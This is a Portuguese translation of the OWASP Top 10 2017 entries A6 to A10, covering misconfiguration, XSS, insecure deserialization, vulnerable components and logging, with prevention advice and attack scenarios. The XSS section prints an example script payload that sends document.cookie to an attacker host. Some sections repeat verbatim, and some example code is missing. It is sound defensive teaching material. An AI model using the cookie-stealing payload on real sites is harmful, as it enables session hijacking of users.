#  A6:2017-Security Misconfiguration

- Agentes de ameaças/vetores de ataque

Os invasores muitas vezes tentam explorar falhas não corrigidas ou acessar contas padrão, páginas não utilizadas, arquivos e diretórios desprotegidos, etc., para obter acesso não autorizado ou conhecimento do sistema.


- O aplicativo é vulnerável?

O aplicativo poderá ser vulnerável se: </p>
* Faltar reforço de segurança apropriado em qualquer parte da pilha de aplicativos ou permissões configuradas incorretamente em serviços de nuvem. </p>
* Recursos desnecessários estão habilitados ou instalados (por exemplo, portas, serviços, páginas, contas ou privilégios desnecessários). </p>
* Contas padrão e suas senhas ainda habilitadas e inalteradas.
* O tratamento de erros revela rastreamentos de pilha ou outras mensagens de erro excessivamente informativas aos usuários. </p>
* Para sistemas atualizados, os recursos de segurança mais recentes estão desativados ou não configurados de forma segura.
* As configurações de segurança nos servidores de aplicativos, estruturas de aplicativos (por exemplo, Struts, Spring, ASP.NET), bibliotecas, bancos de dados, etc., não estão definidas para valores seguros.
* O servidor não envia cabeçalhos ou diretivas de segurança ou eles não estão configurados para valores seguros. </p>
* O software está desatualizado ou vulnerável (consulte A9:2017-Usando Componentes com Vulnerabilidades Conhecidas ). </p>
* Sem um processo de configuração de segurança de aplicativos coordenado e repetível, os sistemas correm um risco maior. </p>

# Como prevenir


- Devem ser implementados processos de instalação seguros, incluindo:

* Um processo de proteção repetível que torna rápida e fácil a implantação de outro ambiente que esteja devidamente bloqueado. Os ambientes de desenvolvimento, controle de qualidade e produção devem ser configurados de forma idêntica, com credenciais diferentes usadas em cada ambiente. Este processo deve ser automatizado para minimizar o esforço necessário para configurar um novo ambiente seguro. </p>

* Uma plataforma mínima sem recursos, componentes, documentação e amostras desnecessárias. Remova ou não instale recursos e estruturas não utilizados.

* Uma tarefa para revisar e atualizar as configurações apropriadas para todas as notas de segurança, atualizações e patches como parte do processo de gerenciamento de patches (consulte A9:2017-Usando Componentes com Vulnerabilidades Conhecidas ). Em particular, revise as permissões de armazenamento em nuvem (por exemplo, permissões de bucket S3). </p>

* Uma arquitetura de aplicativo segmentada que fornece separação eficaz e segura entre componentes ou locatários, com segmentação, conteinerização ou grupos de segurança em nuvem (ACLs). </p>
* Envio de diretivas de segurança para clientes, por exemplo, Security Headers .
* Um processo automatizado para verificar a eficácia das configurações e definições em todos os ambientes. </p>


- Exemplos de cenários de ataque

- Cenário nº 1 :
O servidor de aplicativos vem com aplicativos de amostra que não são removidos do servidor de produção. Esses aplicativos de amostra apresentam falhas de segurança conhecidas que os invasores usam para comprometer o servidor. Se um desses aplicativos for o console de administração e as contas padrão não tiverem sido alteradas, o invasor fará login com as senhas padrão e assumirá o controle. </p>

- Cenário nº 2 : 
A listagem de diretórios não está desabilitada no servidor. Um invasor descobre que pode simplesmente listar diretórios. O invasor encontra e baixa as classes Java compiladas, que descompila e faz engenharia reversa para visualizar o código. O invasor então encontra uma falha grave de controle de acesso no aplicativo. </p>

- Cenário #3 :
A configuração do servidor de aplicação permite que mensagens de erro detalhadas, por exemplo, rastreamentos de pilha, sejam retornadas aos usuários. Isso potencialmente expõe informações confidenciais ou falhas subjacentes, como versões de componentes que são conhecidas por serem vulneráveis. </p>

- Cenário nº 4 : 
Um provedor de serviços em nuvem tem permissões de compartilhamento padrão abertas na Internet por outros usuários do CSP. Isso permite que dados confidenciais armazenados no armazenamento em nuvem sejam acessados. </p>

link: Link: https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration


# A7:2017-Cross-Site Scripting (XSS)


- Agentes de ameaças/vetores de ataque

Ferramentas automatizadas podem detectar e explorar todas as três formas de XSS, e existem estruturas de exploração disponíveis gratuitamente.</p>

- Fraqueza de segurança

XSS é o segundo problema mais prevalente no Top 10 da OWASP e é encontrado em cerca de dois terços de todas as aplicações. </p>
Ferramentas automatizadas podem encontrar alguns problemas de XSS automaticamente, especialmente em tecnologias maduras como PHP, J2EE/JSP e ASP.NET. </p>


- O aplicativo é vulnerável?

- Existem três formas de XSS, geralmente direcionadas aos navegadores dos usuários:
* XSS refletido : o aplicativo ou API inclui entradas de usuário não validadas e sem escape como parte da saída HTML. Um ataque bem-sucedido pode permitir que o invasor execute HTML e JavaScript arbitrários no navegador da vítima. Normalmente, o usuário precisará interagir com algum link malicioso que aponta para uma página controlada pelo invasor, como sites maliciosos, anúncios ou similares. </p>

* XSS armazenado : o aplicativo ou API armazena entradas não higienizadas do usuário que são visualizadas posteriormente por outro usuário ou administrador. O XSS armazenado é frequentemente considerado um risco alto ou crítico. </p>

* DOM XSS : estruturas JavaScript, aplicativos de página única e APIs que incluem dinamicamente dados controláveis ​​pelo invasor em uma página são vulneráveis ​​ao DOM XSS. Idealmente, o aplicativo não enviaria dados controláveis ​​pelo invasor para APIs JavaScript inseguras. </p>

- Os ataques XSS típicos incluem roubo de sessão, controle de conta, desvio de MFA, substituição ou desfiguração de nó DOM (como painéis de login de trojan), ataques contra o navegador do usuário, como downloads de software malicioso, registro de chaves e outros ataques do lado do cliente. </p>

# Como prevenir

- A prevenção do XSS requer a separação de dados não confiáveis ​​do conteúdo ativo do navegador. Isso pode ser alcançado através de: </p>

* Usando frameworks que escapam automaticamente do XSS por design, como o mais recente Ruby on Rails, React JS. Aprenda as limitações da proteção XSS de cada estrutura e lide adequadamente com os casos de uso que não são cobertos. </p>

* O escape de dados de solicitação HTTP não confiáveis ​​com base no contexto na saída HTML (corpo, atributo, JavaScript, CSS ou URL) resolverá vulnerabilidades de XSS refletidas e armazenadas. A Folha de Dicas do OWASP 'Prevenção XSS' contém detalhes sobre as técnicas de escape de dados necessárias. </p>

* A aplicação de codificação sensível ao contexto ao modificar o documento do navegador no lado do cliente atua contra o DOM XSS. Quando isso não puder ser evitado, técnicas de escape sensíveis ao contexto semelhantes podem ser aplicadas às APIs do navegador, conforme descrito na folha de dicas do OWASP 'DOM based XSS Prevention'. </p>

* Habilitar uma Política de Segurança de Conteúdo (CSP) como um controle de mitigação de defesa em profundidade contra XSS. É eficaz se não existirem outras vulnerabilidades que permitam a colocação de código malicioso através de inclusões de arquivos locais (por exemplo, substituições de passagem de caminho ou bibliotecas vulneráveis ​​de redes de distribuição de conteúdo permitidas). </p>

- Cenário nº 1: 
* O aplicativo usa dados não confiáveis ​​na construção do seguinte snippet HTML sem validação ou escape: O invasor modifica o parâmetro 'CC' no navegador para: Este ataque faz com que o ID de sessão da vítima seja enviado ao site do invasor, permitindo que o invasor sequestre a sessão atual do usuário.  </p>

Observação : os invasores podem usar XSS para derrotar qualquer defesa automatizada de falsificação de solicitação entre sites (CSRF) que o aplicativo possa empregar. </p>

 ````
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
 ````

 link: Link: https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)

 # A8:2017-Insecure Deserialization

 - Agentes de ameaças/vetores de ataque

 A exploração da desserialização é um tanto difícil, já que explorações prontas para uso raramente funcionam sem alterações ou ajustes no código de exploração subjacente. </p>


- Fraqueza de segurança	

* Esta questão está incluída no Top 10 com base em uma pesquisa do setor e não em dados quantificáveis.
Algumas ferramentas podem descobrir falhas de desserialização, mas frequentemente é necessária assistência humana para validar o problema. Espera-se que os dados de prevalência de falhas de desserialização aumentem à medida que ferramentas são desenvolvidas para ajudar a identificá-las e resolvê-las. </p>

- O aplicativo é vulnerável?

- Aplicativos e APIs ficarão vulneráveis ​​se desserializarem objetos hostis ou adulterados fornecidos por um invasor. Isso pode resultar em dois tipos principais de ataques:

* Ataques relacionados a objetos e estruturas de dados em que o invasor modifica a lógica do aplicativo ou consegue execução remota arbitrária de código se houver classes disponíveis para o aplicativo que possam alterar o comportamento durante ou após a desserialização.</p>

* Ataques típicos de adulteração de dados, como ataques relacionados ao controle de acesso, em que estruturas de dados existentes são usadas, mas o conteúdo é alterado. </p>

- A serialização pode ser usada em aplicações para:
* Comunicação remota e entre processos (RPC/IPC)
* Protocolos de conexão, serviços web, corretores de mensagens
* Cache/Persistência
* Bancos de dados, servidores de cache, sistemas de arquivos
* Cookies HTTP, parâmetros de formulário HTML, Tokens de autenticação de API


Aplicativos e APIs ficarão vulneráveis ​​se desserializarem objetos hostis ou adulterados fornecidos por um invasor. Isso pode resultar em dois tipos principais de ataques:
* Ataques relacionados a objetos e estruturas de dados em que o invasor modifica a lógica do aplicativo ou consegue execução remota arbitrária de código se houver classes disponíveis para o aplicativo que possam alterar o comportamento durante ou após a desserialização.
* Ataques típicos de adulteração de dados, como ataques relacionados ao controle de acesso, em que estruturas de dados existentes são usadas, mas o conteúdo é alterado.
A serialização pode ser usada em aplicações para:
* Comunicação remota e entre processos (RPC/IPC)
* Protocolos de conexão, serviços web, corretores de mensagens
* Cache/Persistência
* Bancos de dados, servidores de cache, sistemas de arquivos
* Cookies HTTP, parâmetros de formulário HTML, Tokens de autenticação de API

- Como prevenir

- O único padrão arquitetônico seguro é não aceitar objetos serializados de fontes não confiáveis ​​ou usar meios de serialização que permitam apenas tipos de dados primitivos. Se isso não for possível, considere uma ou mais das seguintes opções: </p>

* Implementar verificações de integridade, como assinaturas digitais, em quaisquer objetos serializados, para evitar a criação de objetos hostis ou a adulteração de dados. </p>

* Aplicar restrições de tipo estritas durante a desserialização antes da criação do objeto, pois o código normalmente espera um conjunto definível de classes. Foram demonstrados desvios para esta técnica, portanto não é aconselhável confiar apenas nela. </p>

* Isolar e executar código que desserializa em ambientes com poucos privilégios, quando possível.
* Registrar exceções e falhas de desserialização, como quando o tipo de entrada não é o tipo esperado ou a desserialização gera exceções. </p>

* Restringir ou monitorar a conectividade de rede de entrada e saída de contêineres ou servidores que são desserializados. </p>

* Monitoramento da desserialização, alertando se um usuário desserializa constantemente.

-  Exemplos de cenários de ataque


O aplicativo é vulnerável?
Aplicativos e APIs ficarão vulneráveis ​​se desserializarem objetos hostis ou adulterados fornecidos por um invasor. Isso pode resultar em dois tipos principais de ataques:
* Ataques relacionados a objetos e estruturas de dados em que o invasor modifica a lógica do aplicativo ou consegue execução remota arbitrária de código se houver classes disponíveis para o aplicativo que possam alterar o comportamento durante ou após a desserialização.
* Ataques típicos de adulteração de dados, como ataques relacionados ao controle de acesso, em que estruturas de dados existentes são usadas, mas o conteúdo é alterado.
A serialização pode ser usada em aplicações para:
* Comunicação remota e entre processos (RPC/IPC)
* Protocolos de conexão, serviços web, corretores de mensagens
* Cache/Persistência
* Bancos de dados, servidores de cache, sistemas de arquivos
* Cookies HTTP, parâmetros de formulário HTML, Tokens de autenticação de API
Como prevenir
O único padrão arquitetônico seguro é não aceitar objetos serializados de fontes não confiáveis ​​ou usar meios de serialização que permitam apenas tipos de dados primitivos. Se isso não for possível, considere uma ou mais das seguintes opções:
* Implementar verificações de integridade, como assinaturas digitais, em quaisquer objetos serializados, para evitar a criação de objetos hostis ou a adulteração de dados.
* Aplicar restrições de tipo estritas durante a desserialização antes da criação do objeto, pois o código normalmente espera um conjunto definível de classes. Foram demonstrados desvios para esta técnica, portanto não é aconselhável confiar apenas nela.
* Isolar e executar código que desserializa em ambientes com poucos privilégios, quando possível.
* Registrar exceções e falhas de desserialização, como quando o tipo de entrada não é o tipo esperado ou a desserialização gera exceções.
* Restringir ou monitorar a conectividade de rede de entrada e saída de contêineres ou servidores que são desserializados.
* Monitoramento da desserialização, alertando se um usuário desserializa constantemente.


- Exemplos de cenários de ataque

* Cenário nº 1 :
Um aplicativo React chama um conjunto de microsserviços Spring Boot. Sendo programadores funcionais, eles tentaram garantir que seu código fosse imutável. A solução que eles encontraram foi serializar o estado do usuário e transmiti-lo a cada solicitação. Um invasor percebe a assinatura do objeto Java “R00” e usa a ferramenta Java Serial Killer para obter execução remota de código no servidor de aplicativos.

* Cenário #2 :
Um fórum PHP usa serialização de objetos PHP para salvar um “super” cookie, contendo o ID do usuário, função, hash de senha e outros estados: Um invasor altera o objeto serializado para obter privilégios de administrador:

link: https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization

# A9:2017-Using Components with Known Vulnerabilities


- Agentes de ameaças/vetores de ataque

Embora seja fácil encontrar explorações já escritas para muitas vulnerabilidades conhecidas, outras vulnerabilidades exigem um esforço concentrado para desenvolver uma exploração personalizada.

- Fraqueza de segurança	

A prevalência deste problema é muito generalizada. Padrões de desenvolvimento com muitos componentes podem fazer com que as equipes de desenvolvimento nem mesmo entendam quais componentes usam em seu aplicativo ou API, muito menos em mantê-los atualizados.
Alguns scanners, como o retire.js, ajudam na detecção, mas determinar a explorabilidade requer esforço adicional. </p>

- O aplicativo é vulnerável?

- Você provavelmente está vulnerável:
* Se você não conhece as versões de todos os componentes que usa (tanto do lado do cliente quanto do lado do servidor). Isso inclui componentes que você usa diretamente, bem como dependências aninhadas.

* Se o software estiver vulnerável, não for compatível ou estiver desatualizado. Isso inclui o sistema operacional, servidor web/aplicativo, sistema de gerenciamento de banco de dados (SGBD), aplicativos, APIs e todos os componentes, ambientes de tempo de execução e bibliotecas.

* Se você não verificar vulnerabilidades regularmente e assinar boletins de segurança relacionados aos componentes que você usa.

* Se você não corrigir ou atualizar a plataforma, as estruturas e as dependências subjacentes de maneira oportuna e baseada em riscos. Isso geralmente acontece em ambientes em que a aplicação de patches é uma tarefa mensal ou trimestral sob controle de alterações, o que deixa as organizações expostas a muitos dias ou meses de exposição desnecessária a vulnerabilidades corrigidas.

* Se os desenvolvedores de software não testarem a compatibilidade de bibliotecas atualizadas, atualizadas ou corrigidas.

* Se você não proteger as configurações dos componentes (consulte A6:2017-Configuração incorreta de segurança ).

- Como prevenir

Deve haver um processo de gerenciamento de patches para:
* Remover dependências não utilizadas, recursos, componentes, arquivos e documentação desnecessários.
* Inventariar continuamente as versões dos componentes do lado do cliente e do lado do servidor (por exemplo, estruturas, bibliotecas) e suas dependências usando ferramentas como versões , DependencyCheck , retire.js , etc. Monitore continuamente fontes como CVE e NVD em busca de vulnerabilidades nos componentes. Use ferramentas de análise de composição de software para automatizar o processo. Assine alertas por e-mail sobre vulnerabilidades de segurança relacionadas aos componentes que você usa.
* Obtenha componentes apenas de fontes oficiais por meio de links seguros. Prefira pacotes assinados para reduzir a chance de incluir um componente malicioso modificado.
* Monitore bibliotecas e componentes que não são mantidos ou não criam patches de segurança para versões mais antigas. Se a aplicação de patches não for possível, considere implantar um patch virtual para monitorar, detectar ou proteger contra o problema descoberto.
Toda organização deve garantir que haja um plano contínuo para monitoramento, triagem e aplicação de atualizações ou alterações de configuração durante a vida útil do aplicativo ou portfólio.

- Exemplos de cenários de ataque

* Cenário nº 1 : 
Os componentes normalmente são executados com os mesmos privilégios que o próprio aplicativo, portanto, falhas em qualquer componente podem resultar em sérios impactos. Tais falhas podem ser acidentais (por exemplo, erro de codificação) ou intencionais (por exemplo, backdoor no componente). Alguns exemplos de vulnerabilidades de componentes exploráveis ​​descobertas são: </p>

* CVE-2017-5638 , uma vulnerabilidade de execução remota de código do Struts 2 que permite a execução de código arbitrário no servidor, foi responsabilizada por violações significativas. </p>

* Embora a Internet das Coisas (IoT) seja frequentemente difícil ou impossível de corrigir, a importância de corrigi-los pode ser grande (por exemplo, dispositivos biomédicos).
Existem ferramentas automatizadas para ajudar os invasores a encontrar sistemas não corrigidos ou configurados incorretamente. Por exemplo, o mecanismo de busca Shodan IoT pode ajudá-lo a encontrar dispositivos que ainda sofrem com a vulnerabilidade Heartbleed , corrigida em abril de 2014. </p>

link: https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities

 # A10:2017-Registro e monitoramento insuficientes

- Agentes de ameaças/vetores de ataque

A exploração de registos e monitorização insuficientes é a base de quase todos os incidentes graves.
Os invasores dependem da falta de monitoramento e de resposta oportuna para atingir seus objetivos sem serem detectados. </p>

- Fraqueza de segurança

Este problema está incluído no Top 10 com base em uma pesquisa do setor .
Uma estratégia para determinar se você tem monitoramento suficiente é examinar os logs após o teste de penetração. As ações dos testadores devem ser suficientemente registradas para compreender quais danos eles podem ter infligido. </p>

- O aplicativo é vulnerável?

* Registro, detecção, monitoramento e resposta ativa insuficientes ocorrem a qualquer momento:
* Eventos auditáveis, como logins, logins com falha e transações de alto valor não são registrados.
* Avisos e erros geram mensagens de log inexistentes, inadequadas ou pouco claras.
* Os logs de aplicativos e APIs não são monitorados em busca de atividades suspeitas.
* Os logs são armazenados apenas localmente.
* Limites de alerta apropriados e processos de escalonamento de resposta não estão em vigor ou não são eficazes.
* Testes de penetração e varreduras por ferramentas DAST (como OWASP ZAP ) não acionam alertas.
* O aplicativo não consegue detectar, escalar ou alertar sobre ataques ativos em tempo real ou quase em tempo real.
Você estará vulnerável ao vazamento de informações se tornar os eventos de registro e alerta visíveis para um usuário ou invasor (consulte A3:2017-Exposição de dados confidenciais ).

- Como prevenir

De acordo com o risco dos dados armazenados ou processados ​​pelo aplicativo: </p>
* Certifique-se de que todas as falhas de login, controle de acesso e falhas de validação de entrada do lado do servidor possam ser registradas com contexto de usuário suficiente para identificar contas suspeitas ou maliciosas e mantidas por tempo suficiente para permitir análise forense atrasada. </p>
* Garanta que os logs sejam gerados em um formato que possa ser facilmente consumido por soluções centralizadas de gerenciamento de logs.</p>
* Garanta que as transações de alto valor tenham uma trilha de auditoria com controles de integridade para evitar adulteração ou exclusão, como tabelas de banco de dados somente anexadas ou similares.</p>
* Estabelecer monitoramento e alertas eficazes para que atividades suspeitas sejam detectadas e respondidas em tempo hábil.</p>
* Estabeleça ou adote um plano de resposta e recuperação de incidentes, como NIST 800-61 rev 2 ou posterior. </p>
Existem estruturas de proteção de aplicativos comerciais e de código aberto, como OWASP AppSensor ( wiki antigo ), firewalls de aplicativos da web, como ModSecurity com o OWASP ModSecurity Core Rule Set , e software de correlação de log com painéis e alertas personalizados. </p>

- Exemplos de cenários de ataque

Cenário nº 1 : Um software de fórum de projeto de código aberto executado por uma pequena equipe foi hackeado usando uma falha em seu software. Os invasores conseguiram destruir o repositório interno do código-fonte que contém a próxima versão e todo o conteúdo do fórum. Embora a fonte pudesse ser recuperada, a falta de monitoramento, registro ou alerta levou a uma violação muito pior. O projeto de software do fórum não está mais ativo devido a esse problema. </p>

Cenário nº 2 : um invasor usa verificações de usuários que usam uma senha comum. Eles podem assumir o controle de todas as contas usando esta senha. Para todos os outros usuários, essa verificação deixa apenas um login falso. Após alguns dias, isso poderá ser repetido com uma senha diferente. </p>

Cenário nº 3 : um grande varejista dos EUA supostamente tinha uma sandbox interna de análise de malware analisando anexos. O software sandbox detectou software potencialmente indesejado, mas ninguém respondeu a essa detecção. O sandbox já vinha produzindo avisos há algum tempo antes de a violação ser detectada devido a transações fraudulentas com cartão por um banco externo. </p>

link:https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring

 
